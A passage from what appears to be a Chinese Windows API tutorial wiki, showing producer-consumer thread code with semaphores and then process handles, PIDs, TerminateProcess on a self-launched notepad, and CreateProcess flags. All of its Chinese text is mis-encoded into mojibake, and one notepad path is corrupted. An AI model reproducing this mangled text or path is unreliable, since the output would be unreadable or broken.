WM_CLOSE: EndDialog(hwndDlg, 0); return TRUE; case WM_INITDIALOG: &#123; g_hEditInput = GetDlgItem(hwndDlg, IDC_EDIT_INPUT); g_hEditBuffer[0] = GetDlgItem(hwndDlg, IDC_EDIT_BUFFER1); g_hEditBuffer[1] = GetDlgItem(hwndDlg, IDC_EDIT_BUFFER2); g_hEditConsumer[0] = GetDlgItem(hwndDlg, IDC_EDIT_CONSUMER1); g_hEditConsumer[1] = GetDlgItem(hwndDlg, IDC_EDIT_CONSUMER2); g_hEditConsumer[2] = GetDlgItem(hwndDlg, IDC_EDIT_CONSUMER3); SetWindowText(g_hEditBuffer[0], &quot;ç©º&quot;); SetWindowText(g_hEditBuffer[1], &quot;ç©º&quot;); g_BufferIsEmpty[0] = TRUE; g_BufferIsEmpty[1] = TRUE; return TRUE; &#125; case WM_COMMAND: switch (LOWORD(wParam)) &#123; case IDC_BUTTON_START: HANDLE hWorkerThread = CreateThread(NULL, 0, WorkerThreadProc, NULL, 0, NULL); CloseHandle(hWorkerThread); return TRUE; &#125; break; &#125; return FALSE;&#125;DWORD WINAPI WorkerThreadProc(LPVOID lpParameter)&#123; g_hSemaphoreEmpty = CreateSemaphore(NULL, BUFFER_COUNT, BUFFER_COUNT, NULL); //åˆå§‹æ—¶ç”Ÿäº§è€…å¯ç”Ÿäº§ä¸¤æ¬¡ g_hSemaphoreFull = CreateSemaphore(NULL, 0, BUFFER_COUNT, NULL); //æ¶ˆè´¹è€…æ²¡èµ„æºå¯ä»¥æ¶ˆè´¹ InitializeCriticalSection(&amp;g_cs); //ç”Ÿäº§è€…çº¿ç¨‹ HANDLE hProducerThread = CreateThread(NULL, 0, ProducerThreadProc, g_hEditInput, 0, NULL); CloseHandle(hProducerThread); //æ¶ˆè´¹è€…çº¿ç¨‹ HANDLE hConsumerThreads[CONSUMER_COUNT] = &#123; NULL &#125;; for (int i = 0; i &lt; CONSUMER_COUNT; i++) &#123; hConsumerThreads[i] = CreateThread(NULL, 0, ConsumerThreadProc, g_hEditConsumer[i], 0, NULL); &#125; //WaitForSingleObject(hProducerThread, INFINITE); WaitForMultipleObjects(CONSUMER_COUNT, hConsumerThreads, TRUE, INFINITE); for (int i = 0; i &lt; CONSUMER_COUNT; i++) &#123; CloseHandle(hConsumerThreads[i]); &#125; CloseHandle(g_hSemaphoreEmpty); CloseHandle(g_hSemaphoreFull); DeleteCriticalSection(&amp;g_cs); return 0;&#125;DWORD WINAPI ProducerThreadProc(LPVOID lpParameter)&#123; HWND hEditInput = (HWND)lpParameter; //ç¼–è¾‘æ¡†-ç”¨æˆ·è¾“å…¥ //å¾—åˆ°ç”¨æˆ·è¾“å…¥æ¡†é‡Œçš„å†…å®¹ char szInputBuffer[20] = &#123; 0 &#125;; GetWindowText(hEditInput, szInputBuffer, 20); for (int i = 0; i &lt; strlen(szInputBuffer); i++) //éå†æ¯ä¸ªå­—ç¬¦ &#123; WaitForSingleObject(g_hSemaphoreEmpty, INFINITE); EnterCriticalSection(&amp;g_cs); for (int j = 0; j &lt; BUFFER_COUNT; j++) //æ‰¾ç©ºçš„ç¼“å†²åŒº &#123; if (g_BufferIsEmpty[j]) //ç¼“å†²åŒºä¸ºç©ºï¼Œå¯æ”¾å…¥æ•°æ® &#123; char szTemp[2] = &#123; szInputBuffer[i], 0 &#125;; SetWindowText(g_hEditBuffer[j], szTemp); g_BufferIsEmpty[j] = FALSE; //æ ‡è®°ç¼“å†²åŒºæ»¡ Sleep(500); //æ–¹ä¾¿è§‚å¯Ÿ break; &#125; &#125; LeaveCriticalSection(&amp;g_cs); ReleaseSemaphore(g_hSemaphoreFull, 1, NULL); &#125; return 0;&#125;DWORD WINAPI ConsumerThreadProc(LPVOID lpParameter)&#123; HWND hEditConsumer = (HWND)lpParameter; while (TRUE) &#123; // ç­‰å¾…ä¿¡å·ï¼Œæœ‰ä¿¡å·åå¼€å§‹è¿›å…¥ä¸´ç•ŒåŒºï¼Œä»ç¼“å†²åŒºä¸­å–å­—ç¬¦ WaitForSingleObject(g_hSemaphoreFull, INFINITE); EnterCriticalSection(&amp;g_cs); for (int i = 0; i &lt; BUFFER_COUNT; i++) &#123; if (!g_BufferIsEmpty[i]) &#123; // å¾—åˆ°ç¼“å†²åŒºä¸­çš„å­—ç¬¦ char szTemp[2] = &#123; 0 &#125;; GetWindowText(g_hEditBuffer[i], szTemp, 2); // æ‹¼æ¥å­—ç¬¦ä¸²åˆ°æ¶ˆè´¹è€…ç¼–è¾‘æ¡†ä¸­ char szConsumerText[256] = &#123; 0 &#125;; GetWindowText(hEditConsumer, szConsumerText, 256); strcat_s(szConsumerText, szTemp); SetWindowText(hEditConsumer, szConsumerText); // ç¼“å†²åŒºç½®ç©º SetWindowText(g_hEditBuffer[i], &quot;ç©º&quot;); g_BufferIsEmpty[i] = TRUE; break; &#125; &#125; LeaveCriticalSection(&amp;g_cs); ReleaseSemaphore(g_hSemaphoreEmpty, 1, NULL); Sleep(1000); //æ–¹ä¾¿è§‚å¯Ÿ &#125; return 0;&#125; æ¶ˆè´¹è€…çº¿ç¨‹ä½•æ—¶é€€å‡ºä¸Šé¢çš„ä»£ç è¿˜æ˜¯æœ‰ç‚¹é—®é¢˜ï¼Œæ¶ˆè´¹è€…çº¿ç¨‹ä¸€ç›´åœ¨å¾ªç¯ä¸­ï¼Œæ²¡æœ‰é€€å‡ºçš„æœºä¼šã€‚æœ‰ä¸‰ç§æ–¹æ³•æ¥ç»“æŸæ¶ˆè´¹è€…çº¿ç¨‹ï¼šä½¿ç”¨ä¸€ä¸ªå…¨å±€çš„æ ‡è®°å˜é‡è¡¨ç¤ºç”Ÿäº§è€…çº¿ç¨‹æ˜¯å¦è¿˜åœ¨ç”Ÿäº§ã€‚å½“ç”Ÿäº§è€…çº¿ç¨‹ç»“æŸæ—¶ï¼Œä¿®æ”¹è¿™ä¸ªæ ‡è®°å˜é‡ï¼Œæ¶ˆè´¹è€…çº¿ç¨‹æ ¹æ®è¿™ä¸ªå˜é‡å†³å®šæ˜¯å¦ç»§ç»­è¿è¡Œã€‚æ¶ˆè´¹è€…çº¿ç¨‹ç­‰å¾…ä¿¡å·é‡æ—¶åŠ ä¸ªæ—¶é—´ï¼Œå¦‚æœç­‰å¾…è¶…æ—¶äº†ï¼Œè®¤ä¸ºç”Ÿäº§è€…ä¸å†ç”Ÿäº§ï¼Œæ¶ˆè´¹è€…çº¿ç¨‹å°±é€€å‡ºã€‚ï¼ˆè¿™ä¸ªæ–¹å¼å¥½äº›ï¼Œå°±æ˜¯WaitForSingleObjectåŠ ä¸ªç­‰å¾…è¶…æ—¶ï¼‰ä½¿ç”¨äº‹ä»¶å¯¹è±¡æ¥é€šçŸ¥æ‰€æœ‰æ¶ˆè´¹è€…çº¿ç¨‹åœ¨ç”Ÿäº§è€…çº¿ç¨‹ç»“æŸåé€€å‡ºã€‚æ–¹æ³•ä¸€ï¼šæ ‡è®°å˜é‡æ–¹æ³•äºŒï¼šç­‰å¾…è¶…æ—¶æ–¹æ³•ä¸‰ï¼šå†ç”¨ä¸ªäº‹ä»¶å¯¹è±¡12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667volatile BOOL g_bIsProducing = TRUE; // å…¨å±€æ ‡è®°å˜é‡DWORD WINAPI ProducerThreadProc(LPVOID lpParameter)&#123; HWND hEditInput = (HWND)lpParameter; char szInputBuffer[20] = &#123; 0 &#125;; GetWindowText(hEditInput, szInputBuffer, 20); for (int i = 0; i &lt; strlen(szInputBuffer); i++) &#123; WaitForSingleObject(g_hSemaphoreEmpty, INFINITE); EnterCriticalSection(&amp;g_cs); for (int j = 0; j &lt; BUFFER_COUNT; j++) &#123; if (g_BufferIsEmpty[j]) &#123; char szTemp[2] = &#123; szInputBuffer[i], 0 &#125;; SetWindowText(g_hEditBuffer[j], szTemp); g_BufferIsEmpty[j] = FALSE; Sleep(500); break; &#125; &#125; LeaveCriticalSection(&amp;g_cs); ReleaseSemaphore(g_hSemaphoreFull, 1, NULL); &#125; g_bIsProducing = FALSE; // ç”Ÿäº§è€…çº¿ç¨‹ç»“æŸï¼Œä¿®æ”¹æ ‡è®°å˜é‡ return 0;&#125;DWORD WINAPI ConsumerThreadProc(LPVOID lpParameter)&#123; HWND hEditConsumer = (HWND)lpParameter; while (g_bIsProducing || WaitForSingleObject(g_hSemaphoreFull, 0) == WAIT_OBJECT_0) &#123; if (WaitForSingleObject(g_hSemaphoreFull, INFINITE) == WAIT_TIMEOUT) &#123; continue; &#125; EnterCriticalSection(&amp;g_cs); for (int i = 0; i &lt; BUFFER_COUNT; i++) &#123; if (!g_BufferIsEmpty[i]) &#123; char szTemp[2] = &#123; 0 &#125;; GetWindowText(g_hEditBuffer[i], szTemp, 2); char szConsumerText[256] = &#123; 0 &#125;; GetWindowText(hEditConsumer, szConsumerText, 256); strcat_s(szConsumerText, szTemp); SetWindowText(hEditConsumer, szConsumerText); SetWindowText(g_hEditBuffer[i], &quot;ç©º&quot;); g_BufferIsEmpty[i] = TRUE; break; &#125; &#125; LeaveCriticalSection(&amp;g_cs); ReleaseSemaphore(g_hSemaphoreEmpty, 1, NULL); Sleep(1000); &#125; return 0;&#125;1234567891011121314151617181920212223242526272829303132333435363738#define CONSUMER_TIMEOUT 5000 // è¶…æ—¶æ—¶é—´5ç§’DWORD WINAPI ConsumerThreadProc(LPVOID lpParameter)&#123; HWND hEditConsumer = (HWND)lpParameter; while (TRUE) &#123; if (WaitForSingleObject(g_hSemaphoreFull, CONSUMER_TIMEOUT) == WAIT_TIMEOUT) &#123; break; // è¶…æ—¶ï¼Œé€€å‡ºçº¿ç¨‹ &#125; EnterCriticalSection(&amp;g_cs); for (int i = 0; i &lt; BUFFER_COUNT; i++) &#123; if (!g_BufferIsEmpty[i]) &#123; char szTemp[2] = &#123; 0 &#125;; GetWindowText(g_hEditBuffer[i], szTemp, 2); char szConsumerText[256] = &#123; 0 &#125;; GetWindowText(hEditConsumer, szConsumerText, 256); strcat_s(szConsumerText, szTemp); SetWindowText(hEditConsumer, szConsumerText); SetWindowText(g_hEditBuffer[i], &quot;ç©º&quot;); g_BufferIsEmpty[i] = TRUE; break; &#125; &#125; LeaveCriticalSection(&amp;g_cs); ReleaseSemaphore(g_hSemaphoreEmpty, 1, NULL); Sleep(1000); &#125; return 0;&#125;123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172HANDLE g_hEventStop = NULL; // å…¨å±€äº‹ä»¶å¯¹è±¡DWORD WINAPI WorkerThreadProc(LPVOID lpParameter)&#123; g_hSemaphoreEmpty = CreateSemaphore(NULL, BUFFER_COUNT, BUFFER_COUNT, NULL); g_hSemaphoreFull = CreateSemaphore(NULL, 0, BUFFER_COUNT, NULL); g_hEventStop = CreateEvent(NULL, TRUE, FALSE, NULL); InitializeCriticalSection(&amp;g_cs); HANDLE hProducerThread = CreateThread(NULL, 0, ProducerThreadProc, g_hEditInput, 0, NULL); CloseHandle(hProducerThread); HANDLE hConsumerThreads[CONSUMER_COUNT] = &#123; NULL &#125;; for (int i = 0; i &lt; CONSUMER_COUNT; i++) &#123; hConsumerThreads[i] = CreateThread(NULL, 0, ConsumerThreadProc, g_hEditConsumer[i], 0, NULL); &#125; WaitForSingleObject(hProducerThread, INFINITE); SetEvent(g_hEventStop); // é€šçŸ¥æ‰€æœ‰æ¶ˆè´¹è€…çº¿ç¨‹åœæ­¢ WaitForMultipleObjects(CONSUMER_COUNT, hConsumerThreads, TRUE, INFINITE); for (int i = 0; i &lt; CONSUMER_COUNT; i++) &#123; CloseHandle(hConsumerThreads[i]); &#125; CloseHandle(g_hSemaphoreEmpty); CloseHandle(g_hSemaphoreFull); CloseHandle(g_hEventStop); DeleteCriticalSection(&amp;g_cs); return 0;&#125;DWORD WINAPI ConsumerThreadProc(LPVOID lpParameter)&#123; HWND hEditConsumer = (HWND)lpParameter; while (TRUE) &#123; DWORD dwWaitResult = WaitForMultipleObjects(2, new HANDLE[2]&#123; g_hSemaphoreFull, g_hEventStop &#125;, FALSE, INFINITE); if (dwWaitResult == WAIT_OBJECT_0 + 1) &#123; break; // æ”¶åˆ°åœæ­¢äº‹ä»¶ï¼Œé€€å‡ºçº¿ç¨‹ &#125; EnterCriticalSection(&amp;g_cs); for (int i = 0; i &lt; BUFFER_COUNT; i++) &#123; if (!g_BufferIsEmpty[i]) &#123; char szTemp[2] = &#123; 0 &#125;; GetWindowText(g_hEditBuffer[i], szTemp, 2); char szConsumerText[256] = &#123; 0 &#125;; GetWindowText(hEditConsumer, szConsumerText, 256); strcat_s(szConsumerText, szTemp); SetWindowText(hEditConsumer, szConsumerText); SetWindowText(g_hEditBuffer[i], &quot;ç©º&quot;); g_BufferIsEmpty[i] = TRUE; break; &#125; &#125; LeaveCriticalSection(&amp;g_cs); ReleaseSemaphore(g_hSemaphoreEmpty, 1, NULL); Sleep(1000); &#125; return 0;&#125;"},{"title":"è¿›ç¨‹ç›¸å…³API","path":"/wiki/Windows_API/è¿›ç¨‹ç›¸å…³API.html","content":"IDä¸å¥æŸ„ ä½¿ç”¨CreateProcessåˆ›å»ºè¿›ç¨‹æ—¶ä¼šè¿”å›ä¸€ä¸ªç»“æ„ä½“LPPROCESS_INFORMATIONï¼Œé‡Œé¢æ˜¯è¿›ç¨‹å¥æŸ„ï¼Œçº¿ç¨‹å¥æŸ„ï¼Œè¿›ç¨‹IDï¼Œçº¿ç¨‹IDå­—æ®µã€‚æˆ‘ä»¬å·²ç»çŸ¥é“å¥æŸ„å°±æ˜¯å½“å‰è¿›ç¨‹ç§æœ‰å¥æŸ„è¡¨é‡Œçš„ä¸€ä¸ªç´¢å¼•äº†ï¼Œé‚£ä¹ˆè¿™é‡Œå°±è®²è®²IDæ˜¯ä»€ä¹ˆã€‚ 123456typedef struct _PROCESS_INFORMATION &#123; HANDLE hProcess; //è¿›ç¨‹å¥æŸ„ HANDLE hThread; //çº¿ç¨‹å¥æŸ„ DWORD dwProcessId; //è¿›ç¨‹id DWORD dwThreadId; //çº¿ç¨‹id&#125; PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION; æ¯ä¸ªè¿›ç¨‹éƒ½ä¼šæœ‰ä¸€å¼ ç§æœ‰çš„å¥æŸ„è¡¨ï¼Œè¡¨é‡Œå­˜å‚¨äº†å½“å‰è¿›ç¨‹åˆ›å»ºï¼Œæ‰“å¼€çš„æ‰€æœ‰å†…æ ¸å¯¹è±¡ã€‚ å®é™…ä¸Šï¼Œæ“ä½œç³»ç»Ÿè¿˜æœ‰ä¸€å¼ å¥æŸ„è¡¨ï¼Œè¿™å¼ è¡¨æ˜¯å…¨å±€çš„ã€‚è¿™å¼ å…¨å±€å¥æŸ„è¡¨åŒ…å«äº†æ“ä½œç³»ç»Ÿä¸­æ‰€æœ‰æ­£è¿è¡Œä¸­çš„è¿›ç¨‹ã€çº¿ç¨‹ã€‚å¦‚ä¸‹å›¾ï¼Œå·¦è¾¹é‚£ä¸€åˆ—æ˜¯ç´¢å¼•ï¼ˆè¿›ç¨‹IDå’Œçº¿ç¨‹IDï¼‰ï¼Œå³è¾¹æ˜¯å­˜å‚¨çš„è¿›ç¨‹ã€çº¿ç¨‹å†…æ ¸å¯¹è±¡åœ°å€ã€‚PROCESS_INFORMATIONä¸­çš„è¿›ç¨‹IDå’Œçº¿ç¨‹IDå°±æ˜¯è¿™ä¸ªç´¢å¼•å·ã€‚ è¿›ç¨‹IDï¼ˆProcess IDï¼‰å¯ä»¥é€šè¿‡ä»»åŠ¡ç®¡ç†å™¨çœ‹åˆ°ã€‚è¿™ä¸ªPIDå·æ˜¯å”¯ä¸€çš„ï¼Œä¸ä¼šæœ‰ä¸¤ä¸ªè¿›ç¨‹çš„PIDå·ç›¸åŒã€‚ä¸€ä¸ªè¿›ç¨‹ç»“æŸåï¼Œå®ƒçš„PIDå·å¯èƒ½åˆ†é…ç»™å¦ä¸€ä¸ªæ–°çš„è¿›ç¨‹ã€‚ çº¿ç¨‹IDä¹Ÿæ˜¯å”¯ä¸€çš„ï¼Œä¸ä¼šå‡ºç°æŸä¸¤ä¸ªçº¿ç¨‹ï¼ŒæŸä¸ªè¿›ç¨‹å’ŒæŸä¸ªçº¿ç¨‹ï¼ŒæŸä¸¤ä¸ªè¿›ç¨‹çš„idå·ä¸€æ ·ã€‚ è¯æ˜å…¨å±€å’Œç§æœ‰ PIDæ˜¯å…¨å±€çš„ï¼Œåœ¨ä»»ä½•è¿›ç¨‹ä¸­éƒ½æœ‰æ„ä¹‰ï¼Œéƒ½å¯ä»¥ä½¿ç”¨ï¼Œè€Œå¥æŸ„åˆ™æ˜¯å±€éƒ¨çš„ã€ç§æœ‰çš„ã€‚ä¸‹é¢è®©å…¶ä»–è¿›ç¨‹åˆ†åˆ«ä½¿ç”¨ç›®æ ‡è¿›ç¨‹çš„å¥æŸ„ï¼ˆç§æœ‰çš„ï¼‰å’ŒPIDå·ï¼ˆå…¨å±€çš„ï¼‰æ¥å…³é—­ç›®æ ‡è¿›ç¨‹notepadï¼Œæ¥è¯æ˜å…¨å±€å’Œç§æœ‰ã€‚ ä¾‹ è¢«å…³é—­çš„ç›®æ ‡ç¨‹åº è¿™ä¸ªç¨‹åºä¼šå¯åŠ¨notepadåº”ç”¨ç¨‹åºï¼Œå¹¶æ‰“å°å…¶è¿›ç¨‹IDï¼ˆPIDï¼‰å’Œå¥æŸ„å€¼ 123456789101112131415161718192021222324252627282930313233343536#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main() &#123; STARTUPINFO si; PROCESS_INFORMATION pi; ZeroMemory(&amp;si, sizeof(si)); si.cb = sizeof(si); ZeroMemory(&amp;pi, sizeof(pi)); // åˆ›å»ºè®°äº‹æœ¬è¿›ç¨‹ if (!CreateProcess( TEXT(&quot;C:\\\\Windows\\\\System32\\ otepad.exe&quot;), // ç¨‹åºåç§° NULL, // å‘½ä»¤è¡Œå‚æ•° NULL, // è¿›ç¨‹å®‰å…¨å±æ€§ NULL, // çº¿ç¨‹å®‰å…¨å±æ€§ FALSE, // å¥æŸ„ç»§æ‰¿é€‰é¡¹ 0, // åˆ›å»ºæ ‡å¿— NULL, // ä½¿ç”¨çˆ¶è¿›ç¨‹çš„ç¯å¢ƒå˜é‡ NULL, // ä½¿ç”¨çˆ¶è¿›ç¨‹çš„å½“å‰ç›®å½• &amp;si, // æŒ‡å‘STARTUPINFOçš„æŒ‡é’ˆ &amp;pi // æŒ‡å‘PROCESS_INFORMATIONçš„æŒ‡é’ˆ )) &#123; printf(&quot;CreateProcess failed (%d). &quot;, GetLastError()); return 1; &#125; printf(&quot;Notepad launched with PID: %x &quot;, pi.dwProcessId); printf(&quot;Notepad handle: %x &quot;, pi.hProcess); // é˜»å¡ç­‰å¾…ï¼Œç›´åˆ°æŒ‰ä¸‹ä»»æ„é”® getchar(); return 0;&#125; å°è¯•ä½¿ç”¨ç§æœ‰å¥æŸ„ç»ˆæ­¢è¿›ç¨‹å°è¯•ä½¿ç”¨PIDå·æ‰“å¼€è¿›ç¨‹å¹¶ç»“æŸè¿›ç¨‹1234BOOL TerminateProcess( [in] HANDLE hProcess, [in] UINT uExitCode); TerminateProcesså‡½æ•°å‡½æ•°ç”¨äºç»“æŸè¿›ç¨‹å’Œè¯¥è¿›ç¨‹æ‰€æœ‰çº¿ç¨‹ uExitCodeï¼šå…³é—­è¿›ç¨‹åé€€å‡ºçš„ExitCodeï¼Œè‡ªå·±æŒ‡å®šã€‚éšåå¯ä»¥ç”¨GetExitCodeProcesså‡½æ•°æ•æ‰åˆ°è¿™ä¸ªExitCodeã€‚ TerminateProcesså‡½æ•° Terminates the specified process and all of its threads. 1[in] hProcess A handle to the process to be terminated. The handle must have the PROCESS_TERMINATE access right. For more information, see Process Security and Access Rights. 1[in] uExitCode The exit code to be used by the process and threads terminated as a result of this call. Use the GetExitCodeProcess function to retrieve a processâ€™s exit value. Use the GetExitCodeThread function to retrieve a threadâ€™s exit value. åœ¨ç¨‹åºBä¸­ï¼Œå°†notepadçš„ç§æœ‰å¥æŸ„ä¼ ç»™TerminateProcesså‡½æ•°æ¥å°è¯•å…³æ‰notepadè¿›ç¨‹ã€‚å› ä¸ºè¿™ä¸ªå¥æŸ„æ˜¯notepadç§æœ‰çš„ï¼Œå¯¹ç¨‹åºBæ²¡æœ‰æ„ä¹‰ï¼Œæ‰€ä»¥å…³é—­å¤±è´¥ã€‚ 1234567891011121314151617#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main() &#123; //è¾“å…¥ç›®æ ‡ç¨‹åºçš„ç§æœ‰å¥æŸ„ HANDLE hProcess = (HANDLE)0x114; // å°è¯•ç»ˆæ­¢è¿›ç¨‹ if (!TerminateProcess(hProcess, 0)) &#123; printf(&quot;TerminateProcess failed (%d). &quot;, GetLastError()); &#125; else &#123; printf(&quot;Notepad terminated successfully. &quot;); &#125; return 0;&#125; 12345HANDLE OpenProcess( [in] DWORD dwDesiredAccess, [in] BOOL bInheritHandle, [in] DWORD dwProcessId); OpenProcesså‡½æ•°ç”¨äºæ‰“å¼€ä¸€ä¸ªå·²å­˜åœ¨çš„è¿›ç¨‹ dwDesiredAccessï¼šæ‰“å¼€çš„ç›®æ ‡è¿›ç¨‹å¸Œæœ›æ‹¥æœ‰ä»€ä¹ˆæƒé™ bInheritHandleï¼šæ‰“å¼€ç›®æ ‡è¿›ç¨‹åå¾—åˆ°çš„çš„è¿™ä¸ªå¥æŸ„èƒ½å¦è¢«å­è¿›ç¨‹ç»§æ‰¿ å¦‚æœå…è®¸ï¼Œåœ¨è¿™ä¸ªç¨‹åºä¸­åœ¨åˆ›å»ºä¸€ä¸ªå­è¿›ç¨‹ï¼Œå­è¿›ç¨‹å°±å¯ä»¥ç»§æ‰¿è¿™ä¸ªå¥æŸ„ dwProcessIdï¼šç›®æ ‡è¿›ç¨‹çš„PID OpenProcesså‡½æ•° Opens an existing local process object. 1[in] dwDesiredAccess The access to the process object. This access right is checked against the security descriptor for the process. This parameter can be one or more of the process access rights. If the caller has enabled the SeDebugPrivilege privilege, the requested access is granted regardless of the contents of the security descriptor. 1[in] bInheritHandle If this value is TRUE, processes created by this process will inherit the handle. Otherwise, the processes do not inherit this handle. 1[in] dwProcessId The identifier of the local process to be opened. If the specified process is the System Idle Process (0x00000000), the function fails and the last error code is ERROR_INVALID_PARAMETER. If the specified process is the System process or one of the Client Server Run-Time Subsystem (CSRSS) processes, this function fails and the last error code is ERROR_ACCESS_DENIED because their access restrictions prevent user-level code from opening them. If you are using GetCurrentProcessId as an argument to this function, consider using GetCurrentProcess instead of OpenProcess, for improved performance. é€šè¿‡PIDå·ä½¿ç”¨OpenProcesså‡½æ•°æ¥å¾—åˆ°ä¸€ä¸ªæŒ‡å‘notepadè¿›ç¨‹çš„æ–°å¥æŸ„ï¼Œè¿™ä¸ªæ–°å¥æŸ„æ˜¯å½“å‰è¿›ç¨‹ç‰¹æœ‰çš„ï¼Œå®ƒä¸åŒäºåŸå§‹è¿›ç¨‹ï¼ˆåœ¨è¿™é‡Œä¾‹å­ä¸­æ˜¯è®°äº‹æœ¬ï¼‰åˆ›å»ºæ—¶è·å–çš„å¥æŸ„ã€‚å› ä¸ºç¨‹åºä¸­è¯´äº†è¦ç”¨PROCESS_TERMINATEè®¿é—®æƒé™ï¼Œè¿™æ„å‘³ç€å¾—åˆ°çš„å¥æŸ„å¯ä»¥ç”¨æ¥ç»ˆæ­¢ç›®æ ‡è¿›ç¨‹ã€‚ 123456789101112131415161718192021222324252627282930#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main() &#123; HANDLE hProcess; //å¡«å…¥ç›®æ ‡è¿›ç¨‹çš„PIDå· DWORD dwProcessId = 0x6b2c; // ä½¿ç”¨PIDæ‰“å¼€è¿›ç¨‹ hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, dwProcessId); if (hProcess == NULL) &#123; printf(&quot;OpenProcess failed (%d). &quot;, GetLastError()); return 1; &#125; // å°è¯•ç»ˆæ­¢è¿›ç¨‹ if (!TerminateProcess(hProcess, 0)) &#123; printf(&quot;TerminateProcess failed (%d). &quot;, GetLastError()); &#125; else &#123; printf(&quot;Notepad terminated successfully. &quot;); &#125; // å…³é—­å¥æŸ„ CloseHandle(hProcess); return 0;&#125; CreateProcess é€šè¿‡å‰é¢çš„å­¦ä¹ å·²ç»çŸ¥é“äº†CreateProcesså‡½æ•°ä¸­çš„ä¸€äº›å‚æ•°ï¼Œç°åœ¨è®²ä¸‹å‰©ä¸‹çš„å‡ ä¸ªå‚æ•° 123456789101112BOOL CreateProcess( LPCWSTR lpApplicationName, // è¦å¯åŠ¨çš„ç¨‹åºåï¼ˆè¦å®Œæ•´æ–‡ä»¶è·¯å¾„ï¼‰ LPWSTR lpCommandLine, // å‘½ä»¤è¡Œå‚æ•° LPSECURITY_ATTRIBUTES lpProcessAttributes, // è¿›ç¨‹å¥æŸ„æ˜¯å¦å…è®¸/å¯ä»¥è¢«ç»§æ‰¿ LPSECURITY_ATTRIBUTES lpThreadAttributes, // çº¿ç¨‹å¥æŸ„æ˜¯å¦å…è®¸/å¯ä»¥è¢«ç»§æ‰¿ BOOL bInheritHandles, // æ˜¯å¦ç»§æ‰¿å¥æŸ„ DWORD dwCreationFlags, // LPVOID lpEnvironment, // LPCWSTR lpCurrentDirectory, // LPSTARTUPINFOW lpStartupInfo, // å¯åŠ¨ä¿¡æ¯ LPPROCESS_INFORMATION lpProcessInformation // OUTå‚æ•°ï¼Œä¼ å‡ºè¿›ç¨‹å’Œçº¿ç¨‹çš„ä¿¡æ¯); lpEnvironmentï¼šè¡¨ç¤ºå½“å‰åˆ›å»ºè¿›ç¨‹çš„ç¯å¢ƒå—ï¼Œè¿™ä¸ªå‚æ•°ä¸€èˆ¬æ²¡ä»€ä¹ˆç”¨ï¼Œå¡«NULL 1[in, optional] lpEnvironment A pointer to the environment block for the new process. If this parameter is NULL, the new process uses the environment of the calling process. An environment block consists of a null-terminated block of null-terminated strings. Each string is in the following form: name=value\\0 Because the equal sign is used as a separator, it must not be used in the name of an environment variable. An environment block can contain either Unicode or ANSI characters. If the environment block pointed to by lpEnvironment contains Unicode characters, be sure that dwCreationFlags includes CREATE_UNICODE_ENVIRONMENT. The ANSI version of this function, CreateProcessA fails if the total size of the environment block for the process exceeds 32,767 characters. Note that an ANSI environment block is terminated by two zero bytes: one for the last string, one more to terminate the block. A Unicode environment block is terminated by four zero bytes: two for the last string, two more to terminate the block. dwCreationFlags The flags that control the priority class and the creation of the process. For a list of values, see Process Creation Flags. è¿™ä¸ªå‚æ•°ç”¨äºæ§åˆ¶æ–°è¿›ç¨‹çš„åˆ›å»ºæ–¹å¼ã€‚æ¯”å¦‚åˆ›å»ºæƒ³è®©åˆ›å»ºçš„å­è¿›ç¨‹å•ç‹¬èµ·ä¸€ä¸ªcmdè¾“å‡ºï¼Œå°±å°†dwCreationFlagså­—æ®µè®¾ç½®ä¸ºCREATE_NEW_CONSOLE The new process has a new console, instead of inheriting its parentâ€™s console (the default). For more information, see Creation of a Console. This flag cannot be used with DETACHED_PROCESS. ä¾‹ è¢«è°ƒç”¨ç¨‹åºA 1234567#include &lt;stdio.h&gt;int main() &#123; printf(&quot;Hello from Program A! &quot;); getchar(); return 0;&#125; dwCreationFlagsç½®NULLdwCreationFlagsä½¿ç”¨ CREATE_NEW_CONSOLE123456789101112131415161718192021222324252627282930313233343536373839#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main() &#123; printf(&quot;Hello from Program B! &quot;); STARTUPINFO si; PROCESS_INFORMATION pi; ZeroMemory(&amp;si, sizeof(si)); si.cb = sizeof(si); ZeroMemory(&amp;pi, sizeof(pi)); // åˆ›å»ºè¿›ç¨‹Aï¼Œä¸ä½¿ç”¨ CREATE_NEW_CONSOLE if (!CreateProcess( TEXT(&quot;D:/005_Codefield/VS2019/DiShui_Test/Debug/TestA.exe&quot;), // è¦å¯åŠ¨çš„ç¨‹åºå NULL, // å‘½ä»¤è¡Œå‚æ•° NULL, // è¿›ç¨‹å¥æŸ„ä¸å…è®¸/å¯ä»¥è¢«ç»§æ‰¿ NULL, // çº¿ç¨‹å¥æŸ„ä¸å…è®¸/å¯ä»¥è¢«ç»§æ‰¿ FALSE, // ä¸ç»§æ‰¿çˆ¶è¿›ç¨‹å¥æŸ„ 0, // åˆ›å»ºæ ‡å¿—ï¼Œ0è¡¨ç¤ºæ²¡æœ‰è®¾ç½® NULL, // NULL, // &amp;si, // æŒ‡å‘STARTUPINFOçš„æŒ‡é’ˆ &amp;pi // æŒ‡å‘PROCESS_INFORMATIONçš„æŒ‡é’ˆ )) &#123; printf(&quot;CreateProcess failed (%d). &quot;, GetLastError()); return 1; &#125; // ç­‰å¾…è¿›ç¨‹Aç»“æŸ WaitForSingleObject(pi.hProcess, INFINITE); // å…³é—­è¿›ç¨‹å’Œçº¿ç¨‹çš„å¥æŸ„ CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return 0;&#125; å­è¿›ç¨‹å°±ä¼šå’Œçˆ¶è¿›ç¨‹å…±ç”¨ä¸€ä¸ªcmd 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main() &#123; printf(&quot;Hello from Program B! &quot;); STARTUPINFO si; PROCESS_INFORMATION pi; ZeroMemory(&amp;si, sizeof(si)); si.cb = sizeof(si); ZeroMemory(&amp;pi, sizeof(pi)); // åˆ›å»ºè¿›ç¨‹Aï¼Œä½¿ç”¨ CREATE_NEW_CONSOLE if (!CreateProcess( TEXT(&quot;D:/005_Codefield/VS2019/DiShui_Test/Debug/TestA.exe&quot;), // 